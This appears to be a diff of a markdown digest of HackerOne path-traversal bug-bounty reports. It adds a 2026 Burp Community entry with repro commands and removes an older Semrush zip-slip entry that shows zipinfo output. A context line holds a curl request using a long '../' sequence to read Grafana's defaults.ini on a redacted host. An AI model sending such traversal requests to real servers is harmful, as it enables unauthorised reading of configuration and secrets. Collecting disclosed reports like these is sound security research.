@@ -330,6 +330,21 @@ dbus:x:81:81:System message bus:/:/sbin/nologin
 curl --path-as-is https://grafana-303ca6f8-█████████.aivencloud.com/public/plugins/mysql/../../../../../../../../../../../../usr/share/grafana/conf/defaults.ini
 ```
 
+## #4000535 Burp Community OpenAPI site-map action reads a local schema example through $id rebasing — portswigger — $1,000 — Path Traversal
+Source: `hackerone/reports/2026/4000535.md` (https://hackerone.com/reports/4000535)
+
+```
+python3 -B verify_shapes.py
+```
+
+```
+REPRO_SHAPES=PASS
+```
+
+```
+python3 repro_server.py --mode exploit --schema local-schema.json
+```
+
 ## #1575014 Limited path traversal in Node.js SDK leads to PII disclosure — stripe — $1,000 — Information Disclosure
 Source: `hackerone/reports/2023/1575014.md` (https://hackerone.com/reports/1575014)
 
@@ -1194,28 +1209,5 @@ grep -n "VCS_METADATA_DIRS" weblate/utils/files.py
 ```
 sed -n '105,115p' weblate/trans/component_copy.py
 # 109: ignore_vcs_metadata = shutil.ignore_patterns(".git", ".hg", ".svn", ".bzr")
-```
-
-## #316713 Ad Builder Display Ads Path Traversal — semrush — - — Path Traversal
-Source: `hackerone/reports/2020/316713.md` (https://hackerone.com/reports/316713)
-
-```
-Zip file path    Extracted file path
-data.csv      => /██████/█████/ab_███████_1246354_displayAds.tmp.unpack/data.csv
-words.csv     => /████████/████/ab_███_1246354_displayAds.tmp.unpack/words.csv
-../1.png      => /█████████/███/1.png
-```
-
-```
-{"jsonrpc":"2.0","id":"1c46d1ff-7327-4be2-8b8f-69c1906fb71c","error":{"code":-32603,"message":"mkdir /███████/█████/ab_███_1246354_displayAds.tmp.unpack/link: not a directory"}}
-```
-
-```
-$ zipinfo display-ads-deb.zip
-Archive:  display-ads-deb.zip
-Zip file size: 581 bytes, number of entries: 2
--rw-r--r--  3.0 unx      432 tx defN 18-Feb-16 07:35 data.csv
--rw-r--r--  3.0 unx       48 tx stor 18-Feb-15 18:28 words.csv
-2 files, 480 bytes uncompressed, 269 bytes compressed:  44.0%
 ```
 
